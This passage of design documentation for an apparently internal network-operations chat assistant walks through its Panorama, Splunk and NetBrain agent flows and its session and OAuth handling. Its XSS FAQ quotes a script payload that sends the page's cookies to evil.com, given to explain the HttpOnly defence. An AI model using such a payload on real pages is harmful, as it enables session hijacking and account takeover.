The XML response contains address object entries with `<ip-netmask>`, `<ip-range>`, or `<fqdn>`. The tool uses Python's `ipaddress` module to check containment:

- `ip-netmask` with CIDR → `ip in ipaddress.ip_network(...)`
- `ip-netmask` without CIDR → exact IP comparison
- `ip-range` → `start <= ip <= end`
- FQDN → skipped (cannot match IP)

Matching objects are collected: e.g., `{"name": "web-server-01", "type": "ip-netmask", "value": "11.0.0.0/24"}`.

### Step 8c: Find address groups containing those objects

```
GET /api/?type=config&action=get
    &xpath=/config/devices/entry[@name='localhost.localdomain']/device-group/entry[@name='<dg-name>']/address-group
    &key=<api_key>
```

Each address group entry has `<static><member>` children. The tool checks whether any matching address object name appears as a member. Nested groups (groups containing groups) are resolved recursively.

### Return value

```python
{
    "ip_address": "11.0.0.1",
    "address_objects": [
        {"name": "web-server-01", "type": "ip-netmask", "value": "11.0.0.0/24",
         "location": "device-group", "device_group": "<dg-name>"}
    ],
    "address_groups": [
        {"name": "web-servers", "location": "device-group", "device_group": "<dg-name>",
         "members": ["web-server-01"]}
    ],
    "device_group": null,
    "vsys": "vsys1"
}
```

---

## Step 9: Result Normalization (chat_service.py)

**File:** [chat_service.py](../../chat_service.py) → `_normalize_result()`

For `query_panorama_ip_object_group`, normalization generates a human-readable `direct_answer`:

```python
if tool_name == "query_panorama_ip_object_group" and result.get("address_groups"):
    group_names = [ag.get("name") for ag in address_groups]
    # → ["web-servers"]
    direct_answer = "11.0.0.1 is part of address group 'web-servers'"
    # If resolved via address objects:
    direct_answer += " (via web-server-01)"
    result["direct_answer"] = direct_answer
```

For `query_panorama_address_group_members`:

```python
if tool_name == "query_panorama_address_group_members":
    count = len(members)
    direct_answer = f"Address group 'web-servers' contains {count} members"
    result["direct_answer"] = direct_answer
```

---

## Step 10: Conversation History Persistence (FastAPI)

**File:** [app.py](../../app.py), [chat_history.py](../../chat_history.py)

After `process_message()` returns:

```python
if conversation_id:
    append_to_conversation(APP_DIR, username, conversation_id, user_msg, assistant_content)
else:
    title = user_msg[:60] + "…"
    conv_id = create_conversation(APP_DIR, username, title)
    append_to_conversation(APP_DIR, username, conv_id, user_msg, assistant_content)
    result["conversation_id"] = conv_id
```

Conversations are stored per-user on disk. The `conversation_id` is returned in the response so the frontend can track it.

---

## Step 11: Response Rendering (Frontend)

**File:** [frontend/src/stores/chatStore.js](../../frontend/src/stores/chatStore.js)

```js
const content = data.content ?? data.message ?? 'No response'
addMessage('assistant', content)
```

`content` is the normalized result dict from the backend.

### Response classification

**File:** [frontend/src/utils/responseClassifier.js](../../frontend/src/utils/responseClassifier.js)

`classifyResponse(content)` examines the object shape:

```js
// Panorama result has address_groups array → classified as 'table'
const arrayKeys = Object.keys(c).filter(k => Array.isArray(v) && v.every(...))
// → arrayKeys = ["address_objects", "address_groups"]
return { type: 'table', content }
```

### AssistantMessage rendering

**File:** [frontend/src/components/messages/AssistantMessage.jsx](../../frontend/src/components/messages/AssistantMessage.jsx)

```jsx
// Direct answer badge shown at top (e.g. "11.0.0.1 is part of address group 'web-servers'")
{hasDirectAnswer && <DirectAnswerBadge text={content.direct_answer} />}

// Tables rendered in order: members → address_objects → address_groups → policies
const tableOrder = ['members', 'address_objects', 'address_groups', 'policies']
for (const key of tableOrder) {
    groups.push({ type: 'horizontal', rows: arr, columns: colOrder, heading })
}
```

Panorama-specific column ordering is defined in `formatters.js` via `PANORAMA_COLUMN_ORDER` and `PANORAMA_TABLE_LABELS`, ensuring consistent column display.

Hidden fields (not rendered in tables): `vsys`, `queried_ip`, `intent`, `format`, `desc_units`, etc.

---

## Path 2: A2A Risk Assessment (risk intent)

Used for: "is 11.0.0.1 suspicious?", "are there any risks with 10.0.0.1?"

### LangGraph entry

**File:** [`graph_builder.py`](../../graph_builder.py), [`graph_nodes.py`](../../graph_nodes.py)

`classify_intent` assigns `intent = "risk"` when the prompt contains one IP address plus risk keywords (suspicious, threat, risky, unusual, malicious, etc.). The graph routes `risk` → `risk_orchestrator` node → `build_final_response`.

```
classify_intent (intent="risk")
    │
    ▼
risk_orchestrator   ←── graph_nodes.py: calls orchestrate_ip_risk()
    │                       │
    │               agents/orchestrator.py
    │                   │               │
    ├── A2A POST ────────►               │
    │   localhost:8003                  │
    │   (Panorama agent)                │
    │                               A2A POST ──► localhost:8002
    │                                           (Splunk agent)
    │                   asyncio.gather waits for both
    │                   ↓
    │               _synthesize() ←── skills/risk_synthesis.md (system prompt)
    │                   ↓
    │               Ollama LLM → risk assessment string
    ▼
build_final_response → DirectAnswerBadge.jsx
```

### risk_orchestrator node

**File:** [`graph_nodes.py`](../../graph_nodes.py) — `risk_orchestrator(state)`

The node extracts `prompt` from the LangGraph state and delegates to `orchestrate_ip_risk()`:

```python
async def risk_orchestrator(state: AtlasState) -> dict:
    result = await orchestrate_ip_risk(state["prompt"], username=..., session_id=...)
    return {"final_response": result}
```

### Fan-out to agents in parallel

**File:** [`agents/orchestrator.py`](../../agents/orchestrator.py)

The orchestrator extracts the IP with a regex, constructs descriptive natural language tasks, and fires both A2A calls simultaneously:

```python
panorama_task = (
    "Assess the Panorama security posture for IP 11.0.0.1. "
    "Find which address group it belongs to, list the group members, "
    "and show all referencing security policies."
)
splunk_task = (
    "Analyze Splunk firewall data for IP 11.0.0.1. "
    "Get recent deny events, a traffic summary broken down by action, "
    "and destination spread (unique destination IPs and ports)."
)

panorama_result, splunk_result = await asyncio.gather(
    _call_agent(PANORAMA_AGENT_URL, panorama_task),   # HTTP POST localhost:8003
    _call_agent(SPLUNK_AGENT_URL,   splunk_task),     # HTTP POST localhost:8002
)
```

Each `_call_agent` call sends an A2A-format JSON body and returns the text from the `artifacts` in the response. Both run concurrently — neither waits for the other.

### Panorama agent internals

**File:** [`agents/panorama_agent.py`](../../agents/panorama_agent.py) — FastAPI, port 8003

The Panorama agent is a standalone FastAPI service. It receives the A2A task at `POST /` and runs the shared tool-calling loop.

**Skill:** `skills/panorama_agent.md` is loaded at request time via `_load_skill()` and passed as the system prompt to `run_agent_loop`. It provides Panorama domain knowledge — address objects, device groups, zones, policy concepts — so the LLM can interpret tool results accurately.

**Agent loop** ([`agents/agent_loop.py`](../../agents/agent_loop.py)):

```
SystemMessage: skills/panorama_agent.md   ← domain knowledge
HumanMessage:  "Assess the Panorama security posture for IP 11.0.0.1..."
    ↓
LLM (Ollama, llm.bind_tools([5 tools]))   ← tool docstrings drive selection
    ↓
tool_call: panorama_ip_object_group(ip_address="11.0.0.1")
    ↓
ToolMessage: {"address_groups": [{"name": "leander_web", "device_group": "leander"}]}
    ↓
tool_call: panorama_address_group_members(address_group_name="leander_web", device_group="leander")
    ↓
ToolMessage: {"members": [...], "policies": [...]}
    ↓
AIMessage: "11.0.0.1 belongs to address group leander_web..."   ← no more tool_calls → loop ends
```

The loop runs up to 5 iterations. At each step the LLM decides whether to call another tool or produce a final answer. Tool docstrings (`Use for / Do NOT use for / Examples`) drive which tool gets called and with what arguments — `skills/panorama_agent.md` provides background knowledge but has no tool-selection logic.

**Available tools:**

| Tool | Purpose |
|---|---|
| `panorama_ip_object_group` | Find which address groups contain an IP |
| `panorama_address_group_members` | Get members and referencing security policies for a group |
| `panorama_unused_objects` | Find orphaned/unused objects |
| `panorama_firewall_zones` | Get security zones for firewall interfaces |
| `panorama_firewall_device_group` | Get device group for one or more firewalls |

Returns a **natural language summary** in the A2A artifact format.

### Splunk agent internals

**File:** [`agents/splunk_agent.py`](../../agents/splunk_agent.py) — FastAPI, port 8002

Identical pattern. **Skill:** `skills/splunk_agent.md` is loaded as the system prompt — Splunk domain knowledge (deny events, risk signals, traffic fields).

The LLM runs the same tool-calling loop with three Splunk tools:

| Tool | Purpose |
|---|---|
| `splunk_recent_denies` | Firewall deny events for the IP in the last 24h |
| `splunk_traffic_summary` | Total traffic counts broken down by action (allow/deny) |
| `splunk_unique_destinations` | Unique destination IPs and ports (spread analysis) |

Returns a natural language summary of the IP's Splunk traffic behavior.

### Synthesis

**File:** [`agents/orchestrator.py`](../../agents/orchestrator.py) — `_synthesize()`

**Skill:** `skills/risk_synthesis.md` is loaded and used as the **system prompt** for the synthesis LLM call. Unlike the agent loops above, this call has **no tools bound** — it is a pure text completion. The skill file specifies:
- What risk signals to look for (deny counts, destination spread thresholds, sensitive ports)
- The exact output format to produce (Verdict, Panorama section, Splunk section, Recommendation)

```python
user_content = (
    f"User query: {prompt}\n\n"
    f"IP address: {ip}\n\n"
    f"--- Panorama Agent Summary ---\n{panorama_text}\n\n"
    f"--- Splunk Agent Summary ---\n{splunk_text}"
)
messages = [SystemMessage(content=skill), HumanMessage(content=user_content)]
response = await llm.ainvoke(messages)   # no tools — text completion only
```

The synthesis LLM (Ollama) reads both agent summaries and produces a structured assessment:

```
**Verdict:** <one sentence>

**Panorama**
- Group: `leander_web` (8 members, device group: `leander`)
- Referencing policies:
| Policy | Action | Source | Destination |
...

**Splunk**
- Deny events (24h): 0
- Total traffic events: 42 (38 allow, 4 deny)
- Destination spread: 3 unique IPs, 2 unique ports

**Recommendation**
No action required.
```

### Response flow

`orchestrate_ip_risk` returns `{"role": "assistant", "content": {"direct_answer": synthesis}}` → `risk_orchestrator` node sets `final_response` → LangGraph routes to `build_final_response` → `DirectAnswerBadge.jsx` renders with ReactMarkdown + remark-gfm (table support).

---

## Path 3: NetBrain Path Query (netbrain intent)

Used for: "find path from 10.0.0.1 to 10.0.1.1", "trace route between hosts", "is traffic from X to Y on TCP 443 allowed?"

### LangGraph entry

**File:** [`graph_builder.py`](../../graph_builder.py), [`graph_nodes.py`](../../graph_nodes.py)

`classify_intent` assigns `intent = "netbrain"` when the prompt contains two IP addresses, or path keywords (path, route, trace, hops). The graph routes `netbrain` → `netbrain_agent` node → `build_final_response`.

```
classify_intent (intent="netbrain")
    │
    ▼
netbrain_agent node   ←── graph_nodes.py: A2A POST to localhost:8004
    │
    ▼
NetBrain agent (port 8004)
    │   agent_loop.py (tool-calling loop, up to 5 iterations)
    │   SystemMessage: skills/netbrain_agent.md
    │
    ├── tool_call: netbrain_query_path  ──► MCP Server → NetBrain API
    │
    └── tool_call: ask_panorama_agent  ──► A2A POST localhost:8003
                                            │
                                            ▼
                                        Panorama agent (port 8003)
                                            agent_loop.py (tool-calling loop)
                                            SystemMessage: skills/panorama_agent.md
                                            → zones + device group
    ↓
AIMessage: path summary with enriched firewall hops
    ↓
build_final_response → DirectAnswerBadge.jsx
```

### netbrain_agent node

**File:** [`graph_nodes.py`](../../graph_nodes.py) — `netbrain_agent(state)`

Unlike `risk_orchestrator`, this node does **not** pre-process the prompt. It forwards the raw user prompt verbatim as an A2A task to the NetBrain agent at port 8004. The NetBrain agent's own LLM interprets the query.

```python
async def netbrain_agent(state: AtlasState) -> dict:
    task = {"id": ..., "message": {"role": "user", "parts": [{"type": "text", "text": state["prompt"]}]}}
    response = await client.post("http://localhost:8004", json=task)
    # extract text from artifacts, return as direct_answer
```

### NetBrain agent internals

**File:** [`agents/netbrain_agent.py`](../../agents/netbrain_agent.py) — FastAPI, port 8004

The NetBrain agent receives the task and runs the shared tool-calling loop.

**Skill:** `skills/netbrain_agent.md` is loaded as the system prompt via `_load_skill()`. It covers path query concepts and — critically — instructs the LLM *when* to call `ask_panorama_agent`: whenever a hop in the path is identified as a Palo Alto firewall, the LLM should ask the Panorama agent for its zones and device group. This cross-agent delegation logic lives in the skill, not in code.

**Agent loop** with 3 tools bound:

| Tool | Transport | Purpose |
|---|---|---|
| `netbrain_query_path` | MCP | Trace hop-by-hop path between two IPs |
| `netbrain_check_allowed` | MCP | Check if traffic is allowed/denied on the path |
| `ask_panorama_agent` | A2A (HTTP POST to port 8003) | Enrich a firewall hop with zones and device group |

**Full tool-calling loop example:**

```
SystemMessage: skills/netbrain_agent.md   ← path concepts + when to call Panorama
HumanMessage:  "Find path from 10.0.0.1 to 10.0.1.1"
    ↓
LLM → tool_call: netbrain_query_path(source="10.0.0.1", destination="10.0.1.1")
    ↓
ToolMessage: {"path_hops": [
    {"device": "SW-CORE-01", "is_firewall": false},
    {"device": "PA-FW-LEANDER", "is_firewall": true, "interfaces": ["Ethernet1/1", "Ethernet1/2"]},
    {"device": "SW-EDGE-02", "is_firewall": false}
]}
    ↓
LLM → tool_call: ask_panorama_agent(
    "Get security zones for PA-FW-LEANDER interfaces Ethernet1/1, Ethernet1/2 and its device group."
)
    ↓  (A2A HTTP POST → Panorama agent runs its own agent_loop with skills/panorama_agent.md)
ToolMessage: "PA-FW-LEANDER is in device group leander.
              Ethernet1/1: trust zone, Ethernet1/2: untrust zone."
    ↓
LLM → AIMessage: "Path from 10.0.0.1 to 10.0.1.1 traverses 3 hops:
    1. SW-CORE-01
    2. PA-FW-LEANDER (device group: leander, Ethernet1/1→trust, Ethernet1/2→untrust)
    3. SW-EDGE-02"
    (no more tool_calls → loop ends)
```

**`ask_panorama_agent` in detail:** This tool is implemented directly in `netbrain_agent.py`. It sends an A2A HTTP POST to port 8003, waits for the Panorama agent's `agent_loop` to complete, and returns the natural language answer as a `ToolMessage`. The Panorama agent runs its full tool-calling loop (`skills/panorama_agent.md` + Panorama tools) independently — the NetBrain agent has no visibility into that inner loop, it only receives the final text.

This is **nested agent-to-agent reasoning**: the NetBrain LLM decides when enrichment is needed, constructs the task text, and integrates the result into its own reasoning chain.

### Response flow

NetBrain agent returns text in A2A artifact format → `netbrain_agent` node extracts text, returns `{"final_response": {"role": "assistant", "content": {"direct_answer": text}}}` → LangGraph routes to `build_final_response` → `DirectAnswerBadge.jsx` renders the path summary.

---

## FAQ

### Why does Atlas use a session cookie?

HTTP is stateless — every request arrives at the server with no memory of who made previous requests. Without a cookie, FastAPI would have to demand credentials on every single request.

**The server sets the cookie — the browser stores and sends it.** After OIDC login, FastAPI signs a session payload (`{ username, group, auth_mode, created_at }`) using `itsdangerous.URLSafeTimedSerializer` and returns it in the HTTP response as a `Set-Cookie` header:

```
Set-Cookie: atlas_session=<signed-payload>; HttpOnly; SameSite=Lax
```

The browser saves this automatically. On every subsequent request to the same origin, the browser includes it in the request headers:

```
Cookie: atlas_session=<signed-payload>
```

FastAPI reads it back with `request.cookies.get("atlas_session")`, verifies the signature, and decodes the payload to identify the user — no database lookup, no server-side session store. The signed payload *is* the session, so sessions survive app restarts with no shared cache needed.

The `group` field drives RBAC: `_check_tool_access()` in `chat_service.py` reads it to decide which tools the user can call. The cookie is `HttpOnly` (JavaScript cannot read or steal it) and `SameSite=Lax` (blocks cross-site request forgery). Because the frontend and backend share the same origin (same scheme, host, and port), the browser attaches the cookie automatically — no explicit `credentials` setting is needed in the frontend fetch calls.

---

### What is AbortController / signal?

A browser `fetch()` call, once started, runs until the server responds or the network fails — there is no built-in way to cancel it from code. `AbortController` is the browser API that adds cancellation.

`new AbortController()` gives you a `controller` object and a `controller.signal`. Passing the `signal` into `fetch({ signal })` links the request to the controller. Calling `controller.abort()` immediately cancels the in-flight request and `fetch` throws an `AbortError`.

In Atlas, `chatStore.sendMessage` creates one `AbortController` per message send and stores it in state. The stop button calls `ctrl.abort()`, which cancels both the `/api/discover` and `/api/chat` requests simultaneously since they share the same signal. This is a **user-abort only** — there is no automatic timeout on `/api/discover`.

---

### Why does sendMessage go through the Zustand store instead of calling the API directly from ChatInput.jsx?

`ChatInput.jsx` could technically call `/api/discover` and `/api/chat` directly, but that would break several things:

**1. Multiple components share the same state.**
`ChatInput.jsx` is not the only component that needs to know what's happening. `ChatWindow.jsx` needs `messages` to render the conversation. A loading indicator needs `isLoading`. A status bar needs `currentStatus`. The stop button needs `abortController` to cancel the in-flight request. If `ChatInput.jsx` held all this as local state, sibling components would have no way to read it without passing props up through their common parent and back down — the standard React prop-drilling problem. With Zustand, any component subscribes directly: `useChatStore(s => s.isLoading)` — no prop chains.

**2. `sendMessage` orchestrates far more than one fetch.**
The function in `chatStore.js` manages:
- Adding the user message to the displayed conversation
- Creating an `AbortController` and storing it in state so the stop button (a completely separate component) can call `ctrl.abort()`
- Calling `/api/discover` → updating `currentStatus` to `"Querying Panorama"`
- Calling `/api/chat` → receiving and displaying the response
- Error handling, cleanup, and setting `isLoading: false`

If this logic lived inside `ChatInput.jsx`, the component would be doing application-level business logic, not UI rendering. It would also be impossible for the stop button to cancel a request whose `AbortController` is a local variable inside a different component.

**3. State must outlive the component.**
React component local state disappears when the component unmounts. Store state persists for the lifetime of the page. If `isLoading: true` were local to `ChatInput.jsx`, navigating away and back would reset it mid-request.

The separation is intentional: `ChatInput.jsx` is a pure UI component — text box, buttons, file picker, nothing else. `chatStore.js` is where all application logic and shared state live.

---

### What is the `state` parameter / CSRF token?

`state` and CSRF token are the same thing — `state` is the parameter name in the OAuth spec; "CSRF token" is what it's protecting against.

**The problem it solves:**

Without `state`, an attacker could trick your browser into completing a login flow that the attacker initiated:

1. Attacker starts an OAuth login on Atlas, gets an authorization URL with their own `code`
2. Attacker sends you a link to `http://localhost:8000/auth/callback?code=<attackers-code>&...`
3. Your browser hits the callback, Atlas exchanges the code — and you're now logged in as the attacker's account

**How `state` prevents this:**

1. When Atlas redirects to Azure, authlib generates a random `state` value (e.g. `a3f9x2`) and stores it in a temporary session cookie in your browser
2. That same `state` is sent as a query param in the authorization URL to Azure
3. Azure echoes it back unchanged: `GET /auth/callback?code=...&state=a3f9x2`
4. `authorize_access_token()` reads the `state` from the callback URL and compares it to what's in the session cookie
5. If they match → request came from your own browser's login flow → safe to proceed
6. If they don't match → something is wrong → rejected

The attack fails at step 4 because the attacker's crafted callback URL would have a `state` that doesn't match anything in your browser's session cookie — Atlas detects the mismatch and rejects it.

In short: **`state` proves that the callback was triggered by the same browser session that started the login.**

---

### Why does the token exchange use POST instead of GET?

The token endpoint exchanges the authorization code for tokens (id_token, access_token, refresh_token). It uses POST for four reasons:

1. **Secrets go in the body, not the URL.** The request includes `client_secret` and the authorization `code`. GET parameters appear in the URL, which gets logged in browser history, server access logs, and proxy logs. POST puts them in the request body, which is not logged by default.

2. **It's a destructive operation.** The authorization code is single-use — this POST consumes and invalidates it. REST convention: reads are GET, actions with side effects are POST.

3. **The OAuth 2.0 spec mandates it.** RFC 6749 §4.1.3 explicitly requires the token request to use POST with `application/x-www-form-urlencoded`. Every provider (Azure, Google, Okta) follows this spec.

4. **URLs have length limits.** GET parameters are in the URL. The `client_secret`, `code`, and `redirect_uri` together can be long — POST body has no practical size limit.

### What happens on a 401 response?

The 401 is sent by **FastAPI** (the app server) — not the browser. Both `/api/discover` and `/api/chat` check the session cookie at the top of the route handler. If the `atlas_session` cookie is missing, expired, or tampered with, FastAPI returns:

```json
HTTP 401
{ "detail": "Not authenticated", "redirect": "/login" }
```

The most common trigger is the 30-minute session TTL expiring while the user was idle. Since `/api/discover` fires first, the 401 typically arrives before `/api/chat` is even attempted.

On the frontend, `checkAuthRedirect` detects the 401, immediately sets `window.location.href = '/login'` — the page navigates away — and throws `'Not authenticated'`. The thrown error is caught by the inner try-catch in `chatStore` and falls back to `currentStatus: 'Processing'`, but the navigation has already happened so this is moot.

### What is XSS and why does HttpOnly protect against it?

**XSS (Cross-Site Scripting)** is an attack where malicious JavaScript is injected into a page and runs in the victim's browser, in the context of your origin — meaning it has the same privileges as your own code.

**How the attack works without HttpOnly:**

1. An attacker finds an input that gets rendered unsanitized into the page (e.g. a chat message displayed as raw HTML).
2. They submit `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`.
3. When another user views the page, the script runs, reads `document.cookie` (which includes `atlas_session`), and sends it to the attacker's server.
4. The attacker uses the stolen cookie to make authenticated requests to Atlas — they are now logged in as the victim.

**Why HttpOnly stops this:**

The browser enforces a hard rule: cookies marked `HttpOnly` are never exposed to JavaScript at all. `document.cookie` simply omits them. The injected `<script>` runs fine but gets back an empty string — there is nothing to steal. The cookie still travels in the `Cookie:` request header on every HTTPS request to the server (that's its entire purpose) — but JS code, including attacker-injected code, can never read it. "HTTP header" refers to the protocol layer, not the unencrypted scheme; HTTPS is just HTTP with TLS encryption on top, and the cookie is protected in transit by TLS regardless.

**What HttpOnly does not protect against:**

HttpOnly only blocks *reading* the cookie from JS. It does not stop an attacker from making requests that *carry* the cookie (the browser still attaches it). That class of attack — making authenticated requests on behalf of the user — is CSRF, which is what `SameSite=Lax` addresses.

**Atlas's exposure:**

Atlas renders chat responses from an LLM. If the LLM ever produced a response containing a `<script>` tag and the frontend rendered it as raw HTML, that would be an XSS vector. React's JSX escapes HTML by default (`dangerouslySetInnerHTML` is not used for chat messages), so injected tags are rendered as literal text — but `HttpOnly` is a second line of defence regardless.

---

## Sequence Diagram

```
User          Browser           FastAPI          chat_service       MCP Server      panoramaauth     Panorama
 │  type query  │                  │                   │                 │                │              │
 │─────────────►│                  │                   │                 │                │              │
 │              │ POST /api/discover│                   │                 │                │              │
 │              │─────────────────►│                   │                 │                │              │
 │              │                  │ validate session   │                 │                │              │
 │              │                  │ check RBAC         │                 │                │              │
 │              │                  │──process_message──►│                 │                │              │
 │              │                  │                   │ list_tools()───►│                 │              │
 │              │                  │                   │◄────────────────│                 │              │
 │              │                  │                   │ LLM: select tool│                 │              │
 │              │                  │                   │ (llama3.1:8b)   │                 │              │
 │              │                  │◄─ tool_display_name─│               │                 │              │
 │              │◄─ {tool: "Panorama"}│                 │                │                 │              │
 │              │ POST /api/chat   │                   │                 │                │              │
 │              │─────────────────►│                   │                 │                │              │
 │              │                  │──process_message──►│                 │                │              │
 │              │                  │                   │ LLM: select tool│                 │              │
 │              │                  │                   │ call_mcp_tool()─►                │              │
 │              │                  │                   │                 │ get_api_key()──►│              │
 │              │                  │                   │                 │                │ GET keygen   │
 │              │                  │                   │                 │                │─────────────►│
 │              │                  │                   │                 │                │◄── API key ──│
 │              │                  │                   │                 │ query address  │              │
 │              │                  │                   │                 │ objects/groups │              │
 │              │                  │                   │                 │────────────────────────────► │
 │              │                  │                   │                 │◄─────────────── XML result ──│
 │              │                  │                   │◄── parsed dict ─│                │              │
 │              │                  │                   │ _normalize_result│               │              │
 │              │                  │◄── normalized JSON─│                │                │              │
 │              │◄─ {content: {...}}│                  │                 │                │              │
 │              │ render tables    │                   │                 │                │              │
 │◄─────────────│                  │                   │                 │                │              │
```

---

## Direct MCP vs A2A Agent: When Each Is Used

| | Direct MCP (network intent) | Agent via A2A (risk intent) |
|---|---|---|
| Trigger | Group/member lookups, unused objects | Risk assessment queries |
| Tool selection | Ollama LLM picks from all MCP tools | Ollama LLM within agent picks from Panorama-only tools |
| Chaining | Deterministic code in `tool_executor` | LLM-driven tool-calling loop |
| Output | Structured JSON → table/visualization | Natural language summary |
| Port | Via MCP server (internal) | HTTP 8003 |

---

## Key Files

| File | Role |
|---|---|
| [`graph_nodes.py`](../../graph_nodes.py) | LangGraph nodes: intent classification, tool selection, execution, risk orchestration |
| [`graph_builder.py`](../../graph_builder.py) | LangGraph graph construction and routing |
| [`graph_state.py`](../../graph_state.py) | State schema shared across all graph nodes |
| [`agents/panorama_agent.py`](../../agents/panorama_agent.py) | Panorama agent — AI agent exposing A2A interface (FastAPI, port 8003) |
| [`agents/splunk_agent.py`](../../agents/splunk_agent.py) | Splunk agent — AI agent exposing A2A interface (FastAPI, port 8002) |
| [`agents/netbrain_agent.py`](../../agents/netbrain_agent.py) | NetBrain agent — AI agent exposing A2A interface (FastAPI, port 8004) |
| [`agents/agent_loop.py`](../../agents/agent_loop.py) | Shared tool-calling loop used by all agents |
| [`agents/orchestrator.py`](../../agents/orchestrator.py) | Risk fan-out: parallel A2A calls + Ollama synthesis |
| [`tools/panorama_tools.py`](../../tools/panorama_tools.py) | Panorama MCP tool implementations + Panorama API calls |
| [`skills/panorama_agent.md`](../../skills/panorama_agent.md) | Panorama agent system prompt |
| [`skills/splunk_agent.md`](../../skills/splunk_agent.md) | Splunk agent system prompt |
| [`skills/netbrain_agent.md`](../../skills/netbrain_agent.md) | NetBrain agent system prompt |
| [`skills/risk_synthesis.md`](../../skills/risk_synthesis.md) | Risk synthesis system prompt |
| [`mcp_client.py`](../../mcp_client.py) | Client that calls the MCP server |
| [`mcp_server.py`](../../mcp_server.py) | MCP server process (FastMCP) |
| [`panoramaauth.py`](../../panoramaauth.py) | Panorama API key management |
